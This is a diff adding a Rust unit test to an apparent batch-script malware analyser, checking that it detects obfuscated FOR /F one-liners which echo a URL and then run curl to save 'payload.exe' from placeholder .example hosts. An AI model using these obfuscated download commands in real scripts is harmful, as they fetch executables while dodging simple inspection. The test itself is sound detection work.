@@ -9852,6 +9852,34 @@ for /f "tokens=* delims=" %%U in ('type ^< url.txt') do curl -o payload.exe %%U"
     }
 
     #[test]
+    fn for_f_inline_echo_pipeline_feeds_later_curl() {
+        for (script, expected) in [
+            (
+                br#"for /f "tokens=* delims=" %%U in ('echo:https://for-f-inline-echo.example/payload.exe') do curl -o payload.exe %%U"#.as_slice(),
+                "https://for-f-inline-echo.example/payload.exe",
+            ),
+            (
+                br#"for /f "tokens=* delims=" %%U in ('echo(https://for-f-paren-echo.example/payload.exe') do curl -o payload.exe %%U"#.as_slice(),
+                "https://for-f-paren-echo.example/payload.exe",
+            ),
+        ] {
+            let report = analyze(script, &Config::default());
+            assert!(
+                report.traits.iter().any(|t| {
+                    matches!(
+                        t,
+                        Trait::Download { src, dst: Some(dst), .. }
+                            if src == expected && dst == "payload.exe"
+                    )
+                }),
+                "FOR /F inline echo pipeline did not feed later curl: {:?}\n{}",
+                report.traits,
+                report.deobfuscated
+            );
+        }
+    }
+
+    #[test]
     fn for_f_find_stdin_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>url.txt
